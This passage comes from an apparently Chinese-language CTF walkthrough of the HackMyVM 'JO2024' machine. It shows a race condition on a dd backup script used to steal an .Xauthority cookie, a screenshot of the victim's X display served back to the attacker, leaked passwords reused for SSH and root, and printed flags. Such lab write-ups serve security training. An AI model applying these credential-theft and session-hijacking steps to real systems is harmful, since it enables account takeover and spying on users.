n\necho \u003cspan class=\"hljs-string\"\u003e\"Starting copy...\"\u003c/span\u003e\nfind \u003cspan class=\"hljs-string\"\u003e\"$SRC\"\u003c/span\u003e -maxdepth \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f ! -name user.txt | \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e read srcfile; do\n    destfile=\u003cspan class=\"hljs-string\"\u003e\"$DEST${srcfile#$SRC}\"\u003c/span\u003e\n    mkdir -p \u003cspan class=\"hljs-string\"\u003e\"$(dirname \"\u003c/span\u003e$destfile\u003cspan class=\"hljs-string\"\u003e\")\"\u003c/span\u003e\n    dd \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"$srcfile\"\u003c/span\u003e of=\u003cspan class=\"hljs-string\"\u003e\"$destfile\"\u003c/span\u003e bs=4M\n\n    md5src=$(md5sum \u003cspan class=\"hljs-string\"\u003e\"$srcfile\"\u003c/span\u003e | cut -d \u003cspan class=\"hljs-string\"\u003e' '\u003c/span\u003e -f1)\n    md5dest=$(md5sum \u003cspan class=\"hljs-string\"\u003e\"$destfile\"\u003c/span\u003e | cut -d \u003cspan class=\"hljs-string\"\u003e' '\u003c/span\u003e -f1)\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ \u003cspan class=\"hljs-string\"\u003e\"$md5src\"\u003c/span\u003e != \u003cspan class=\"hljs-string\"\u003e\"$md5dest\"\u003c/span\u003e ]]; then\n        echo \u003cspan class=\"hljs-string\"\u003e\"MD5 mismatch for $srcfile :(\"\u003c/span\u003e\n    fi\n    chmod \u003cspan class=\"hljs-number\"\u003e700\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"$destfile\"\u003c/span\u003e\ndone\necho \u003cspan class=\"hljs-string\"\u003e\"Copy complete. All files verified !\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传\u003ccode\u003elinpeas\u003c/code\u003e 和 \u003ccode\u003epspy64\u003c/code\u003e收集下信息\u003c/p\u003e\n\u003cp\u003e最后通过\u003ccode\u003epspy64\u003c/code\u003e 发现\u003ccode\u003ebackup\u003c/code\u003e一直在运行， pan class=\"hljs-number\"\u003e1000\u003c/span\u003e  PID=\u003cspan class=\"hljs-number\"\u003e38948\u003c/span\u003e  | /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash /home/vanity/backup \n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e:01 CMD: UID=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e  PID=\u003cspan class=\"hljs-number\"\u003e38951\u003c/span\u003e  | /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash /home/vanity/backup \n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e:01 CMD: UID=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e  PID=\u003cspan class=\"hljs-number\"\u003e38950\u003c/span\u003e  | /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash /home/vanity/backup \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e回到\u003ccode\u003ebackup\u003c/code\u003e 是使用\u003ccode\u003edd\u003c/code\u003e命令去备份文件的，\u003ccode\u003edd\u003c/code\u003e复制文件时\u003cstrong\u003e不会保留原始文件的权限\u003c/strong\u003e，而是使用目标文件的默认权限，并且可以是看到是在复制完毕后再使用\u003ccode\u003echmod 700 \"$destfile\"\u003c/code\u003e 去设置权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 测试\u003c/span\u003e\n┌──(root㉿kali)-[~/Desktop/test/jo2024]\n└─\u003cspan class=\"hljs-comment\"\u003e# ls -al 1.txt    \u003c/span\u003e\n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e月\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e日 07:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003etxt\n                                                                          \n┌──(root㉿kali)-[~/Desktop/test/jo2024]\n└─\u003cspan class=\"hljs-comment\"\u003e# chmod 700 1.txt  \u003c/span\u003e\n                                                                          \n┌──(root㉿kali)-[~/Desktop/test/jo2024]\n└─\u003cspan class=\"hljs-comment\"\u003e# ls -al 1.txt   \u003c/span\u003e\n-rwx------ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e月\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e日 07:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003etxt\n                                                                          \n┌──(root㉿kali)-[~/Desktop/test/jo2024]\n└─\u003cspan class=\"hljs-comment\"\u003e# dd if=1.txt of=/tmp/2.txt bs=4M\u003c/span\u003e\n输入了 \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e+\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e 块记录\n输出了 \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e+\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e 块记录\n\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e 字节已复制，\u003cspan class=\"hljs-number\"\u003e0.000473313\u003c/span\u003e s，\u003cspan class=\"hljs-number\"\u003e10.6\u003c/span\u003e kB/s\n                                                                          \n┌──(root㉿kali)-[~/Desktop/test/jo2024]\n└─\u003cspan class=\"hljs-comment\"\u003e# ls -al /tmp/2.txt \u003c/span\u003e\n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e月\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e日 07:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e /tmp/\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003etxt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么我们就可以使用条件竞争在它修改文件权限前读到文件即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@jo2024:/$ \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e true; do cat /backup/.Xauthority \u003e\u003e /tmp/log \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null;sleep \u003cspan class=\"hljs-number\"\u003e0.01\u003c/span\u003e; done\n\u0026#x3C;Xauthority \u003e\u003e /tmp/log \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null;sleep \u003cspan class=\"hljs-number\"\u003e0.01\u003c/span\u003e; done\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003elog\u003c/code\u003e文件，是二进制文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@jo2024:/$ cat /tmp/log\ncat /tmp/log\ndebian11MIT-MAGIC-COOKIE-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003e\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\nEXJ[fdebian0MIT-MAGIC-COOKIE-1mlJ\n\njo2024.hmv0MIT-MAGIC-COOKIE-1A6\u0026#x26;Xj*Zdebian11MIT-MAGIC-COOKIE-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003e\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e利用 \u003cstrong\u003e.Xauthority\u003c/strong\u003e\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e关于\u003ccode\u003e.Xauthority\u003c/code\u003e 的利用\u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing\"\u003ehttps://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e查看本地会话，目标\u003ccode\u003evanity\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@jo2024:/$ w\n \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:03:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e up  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e,  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e user,  load average: \u003cspan class=\"hljs-number\"\u003e0.44\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0.29\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0.14\u003c/span\u003e\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nvanity   tty7     :\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e               09:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e    \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:43m  \u003cspan class=\"hljs-number\"\u003e0.00\u003c/span\u003es  \u003cspan class=\"hljs-number\"\u003e0.07\u003c/span\u003es /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/lxsession -s LXDE -e LXDE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置环境变量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eexport XAUTHORITY=/tmp/log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后进行截图\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003exwd -root -screen -silent -display :\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003e screenshot.xwd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后将截图传到\u003ccode\u003ekali\u003c/code\u003e上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython3 -m http.server \u003cspan class=\"hljs-number\"\u003e2131\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMJO2024/image38.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后将\u003ccode\u003exwd\u003c/code\u003e格式转换为\u003ccode\u003epng\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003econvert screenshot.xwd screenshot.png\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没想到还能这样玩 what can i say ,看样子是得到了\u003ccode\u003evanity\u003c/code\u003e账户的账号密码（xd0oITR93KIQDbiD）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMJO2024/image39.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登录\u003ccode\u003eSSH\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/jo2024]\n└─\u003cspan class=\"hljs-comment\"\u003e# ssh vanity@192.168.56.13\u003c/span\u003e\nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'192.168.56.13 (192.168.56.13)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:La9YyHs4GERVO8XTRRw0cLh6XcInXX35Ar9OiMsXwQk.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:6: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.13\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\nvanity@192.168.56.13'\u003c/span\u003es password: \nLinux jo2024.hmv \u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64\u003c/span\u003e\n\nThe programs included \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nvanity@jo2024:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eUserFlag\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003evanity@jo2024:~$ cat user.txt \ne2cb9d6e0899cde91130ca4b37139021\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权\u003c/h3\u003e\n\u003cp\u003e查看用户\u003ccode\u003evanity\u003c/code\u003e权限，可以以\u003ccode\u003eroot\u003c/code\u003e权限执行一个\u003ccode\u003eweb\u003c/code\u003e服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003evanity@jo2024:/$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e vanity on jo2024:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e, use_pty\n\nUser vanity may run the following commands on jo2024:\n    (ALL : ALL) NOPASSWD: /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/php-server.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看脚本内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003evanity@jo2024:/$ cat /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/php-server.sh\n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/php -t /opt -S \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8000\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003evanity@jo2024:/$ sudo /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/php-server.sh\n[Tue Jan \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:09 \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e] PHP \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e Development Server (http://\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8000\u003c/span\u003e) started\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问主页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMJO2024/image40.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e奥运会运动员密码泄漏了！\n\n一位黑客声称已经获得了著名奥运会运动员的密码。根据黑客的说法，他设法闯入了著名的短跑运动员Usain Bolt的个人帐户！\n\n黑客提供了他声称是Usain Bolt的帐户密码的证明，以证明他的成就。出于安全原因并保护运动员的隐私，下面的内容模糊不清，需要订阅以揭示。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eF12\u003c/code\u003e可以看到隐藏的内容，得到信息\u003ccode\u003eLightningBolt123\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eAs part of a recent cyber attack, we managed to access Usain Bolt\u003cspan class=\"hljs-string\"\u003e's personal account. The password associated with his account is \u0026#x3C;strong\u003eLightningBolt123\u0026#x3C;/strong\u003e. This breach demonstrates the vulnerabilities of even the most secure systems.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e密码碰撞\u003c/h3\u003e\n\u003cp\u003e密码使用\u003ccode\u003eLightningBolt123\u003c/code\u003e ，成功获取到\u003ccode\u003eRoot\u003c/code\u003e账户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003evanity@jo2024:/$ su root\nPassword: \nroot@jo2024:/\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eRootFlag\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@jo2024:/\u003cspan class=\"hljs-comment\"\u003e# cat /root/root.txt \u003c/span\u003e\ncbd60dab37bc85e1f7ea4b5c9c4eed90\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e.Xauthority\u003c/code\u003e 文件使用\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edd\u003c/code\u003e命令备份文件时与文件原本的权限不同，需要另外设置\u003c/li\u003e\n\u003c/ol\u003e","title":"HackMyVM - JO2024","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"}},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"03","id":"HackMyVMJO2024"},"buildId":"yF9FzNqNcksaGgW9RaEtu","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
